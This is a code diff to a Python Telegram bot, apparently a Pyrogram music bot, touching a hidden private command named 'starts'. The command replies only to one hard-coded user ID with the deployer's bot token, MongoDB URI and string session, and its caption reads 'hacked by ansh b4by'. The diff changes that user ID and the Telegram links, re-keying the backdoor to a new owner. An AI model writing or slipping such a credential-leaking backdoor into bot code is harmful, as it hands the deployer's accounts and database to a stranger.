@@ -120,17 +120,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("starts")
     & filters.private
-    & filters.user(1808943146)
+    & filters.user(6003832175)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f" https://te.legra.ph/file/4277fb6b12ed246adc60b.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 ANSH B4BY.\n\n☆............𝙱𝚈 » [ANSH B4BY](https://t.me/ll_ll_ANSH_B4BY_ll_ll)............☆""",
+          photo=f" https://te.legra.ph/file/415258d46fe154e1155bd.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 ANSH B4BY.\n\n☆............𝙱𝚈 » [ANSH B4BY](https://t.me/I_LOVE_Y0U_MY_HEARTBEET)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                          "• ɦα૮ҡε∂ ɓყ  αɳรɦ ɓ4ɓყ •", url=f"https://t.me/ll_ll_ANSH_B4BY_ll_ll")
+                          "• ɦα૮ҡε∂ ɓყ  αɳรɦ ɓ4ɓყ •", url=f"https://t.me/I_LOVE_Y0U_MY_HEARTBEET")
                  ]
              ]
          ),
